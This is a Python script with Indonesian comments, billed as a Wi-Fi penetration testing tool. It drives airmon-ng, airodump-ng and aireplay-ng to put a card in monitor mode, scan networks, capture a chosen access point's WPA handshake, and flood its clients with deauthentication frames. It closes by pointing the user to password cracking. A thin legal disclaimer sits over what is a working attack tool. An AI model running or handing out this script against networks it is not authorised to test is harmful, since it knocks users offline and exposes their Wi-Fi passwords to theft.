import subprocess
import re
import os

# Fungsi: Cek apakah user adalah root
def check_root():
    if os.geteuid() != 0:
        print("[!] Jalankan dengan sudo!")
        exit(1)

# Fungsi: Deteksi interface wireless
def detect_wireless_interface():
    result = subprocess.run(["iwconfig"], stdout=subprocess.PIPE, stderr=subprocess.PIPE, text=True)
    interfaces = re.findall(r'(\w+)\s+IEEE', result.stdout)
    if not interfaces:
        print("[!] Tidak ada wireless interface yang tersedia.")
        exit(1)
    return interfaces[0]

def enable_monitor_mode(interface):
    print(f"[+] Mengubah {interface} ke mode monitor...")
    subprocess.run(["airmon-ng", "start", interface])
    return f"{interface}mon"

# Fungsi: Matikan mode monitor
def disable_monitor_mode(interface):
    print(f"[+] Mematikan mode monitor pada {interface}...")
    subprocess.run(["airmon-ng", "stop", interface])

# Fungsi: Scan jaringan WiFi
def scan_wifi(interface):
    print("[+] Mulai scanning WiFi... (Tekan Ctrl+C untuk berhenti)")
    try:
        subprocess.run(["airodump-ng", interface])
    except KeyboardInterrupt:
        print("\n[+] Scanning dihentikan.")

# Fungsi: Capture handshake
def capture_handshake(interface, bssid, channel):
    filename = "capture_handshake"
    print(f"[+] Menangkap handshake dari BSSID {bssid} di channel {channel}")
    print(f"[+] Data disimpan ke {filename}.cap")
    try:
        subprocess.run(["airodump-ng", "--bssid", bssid, "-c", str(channel), "-w", filename, interface])
    except KeyboardInterrupt:
        print("\n[+] Pengambilan handshake dihentikan.")

# Fungsi: Deauthenticate client
def deauth_client(interface, bssid, client=None):
    print(f"[+] Melakukan deauth ke BSSID {bssid}")
    command = ["aireplay-ng", "--deauth", "10", "-a", bssid]
    if client:
        command += ["-c", client]
    command += [interface]
    subprocess.run(command)

# Menu utama
def main():
    check_root()

    print("📡 WiFi Scanner & Penetration Testing Tool by Denzz Coder Team")
    print("⚠️ Hanya untuk tujuan edukasi dan uji penetrasi legal, jika anda kena hukum atau melanggar saya tidak tanggung jawab.\n")

    interface = detect_wireless_interface()
    print(f"[✓] Interface ditemukan: {interface}")

    monitor_iface = enable_monitor_mode(interface)
    try:
        # Scan WiFi
        scan_wifi(monitor_iface)

        # Input target
        bssid = input("\nMasukkan BSSID target: ").strip()
        channel = input("Masukkan Channel: ").strip()

        # Capture handshake
        print("\n[+] Mulai capture handshake...")
        capture_process = subprocess.Popen([
            "airodump-ng",
            "--bssid", bssid,
            "-c", channel,
            "-w", "capture_handshake",
            monitor_iface
        ])

        input("Tekan Enter untuk memulai deauth...\n")
        deauth_client(monitor_iface, bssid)

        input("\nTekan Enter untuk menghentikan capture...")
        capture_process.terminate()

        print("\n[+] Handshake berhasil ditangkap (jika ada koneksi ulang dari client).")
        print("Sekarang kamu bisa gunakan tools lain untuk cracking passwordnya.")

    finally:
        disable_monitor_mode(monitor_iface)

if __name__ == "__main__":
    main()